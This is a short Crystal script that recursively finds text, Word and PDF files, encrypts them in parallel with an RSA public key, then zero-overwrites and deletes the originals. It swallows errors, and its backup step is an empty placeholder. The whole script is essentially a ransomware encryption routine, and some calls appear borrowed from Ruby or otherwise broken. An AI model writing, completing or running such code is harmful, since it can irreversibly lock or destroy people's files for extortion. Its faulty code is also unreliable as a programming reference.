require "openssl"
require "concurrent"

# Placeholder for the backup function
def backup_files(file_paths : Array(String))
  puts "Placeholder for backup logic. Implement backup of files here."
  # Implement backup logic here. This could involve copying files to a backup directory.
end

# Securely delete a file by overwriting and then deleting
def overwrite_and_delete(file_path : String)
  file_size = File.size(file_path)
  File.open(file_path, "w") do |file|
    file_size.times { file.print("\0") } # Overwrite with zeros
  end
  File.delete(file_path)
end

# Encrypts file content using RSA and handles errors silently
def safely_process(file_path : String, public_key_path : String)
  begin
    public_key = OpenSSL::PKey::RSA.new(File.read(public_key_path))
    File.open(file_path, "r") do |file|
      encrypted_data = Bytes.new(0)
      until file.eof?
        chunk = file.read_bytes(Bytes.new(245)) # Adjust based on encryption padding requirements
        encrypted_chunk = public_key.public_encrypt(chunk)
        encrypted_data += encrypted_chunk
      end
      File.write("#{file_path}.enc", encrypted_data)
    end

    # Securely delete original file after encryption
    overwrite_and_delete(file_path)
  rescue
    # Error handling: Log or silently ignore errors as per requirement
    puts "An error occurred with file #{file_path}. Continuing..."
  end
end

# Processes files in parallel using fibers
def process_files_in_parallel(files : Array(String), public_key_path : String)
  futures = files.map do |file_path|
    Concurrent::Future.execute { safely_process(file_path, public_key_path) }
  end
  futures.each(&.get)
end

# Main logic to find files, backup, and encrypt
if ARGV.size != 2
  puts "Usage: crystal run script.cr -- <directory_to_encrypt> <public_key_path>"
  exit
end

directory_to_encrypt, public_key_path = ARGV
files_to_process = [] of String

# Recursive method to find files with specific extensions
def find_files(directory : String, extensions : Array(String), files : Array(String))
  Dir.each_child(directory) do |entry|
    full_path = File.join(directory, entry)
    if File.directory?(full_path)
      find_files(full_path, extensions, files)
    elsif extensions.any? { |ext| full_path.ends_with?(ext) }
      files << full_path
    end
  end
end

extensions_to_encrypt = [".txt", ".docx", ".pdf"]
find_files(directory_to_encrypt, extensions_to_encrypt, files_to_process)

if files_to_process.empty?
  puts "No files found to encrypt."
  exit
end

# Backup files before encryption
backup_files(files_to_process)
# Encrypt files in parallel
process_files_in_parallel(files_to_process, public_key_path)
puts "Encryption process completed."
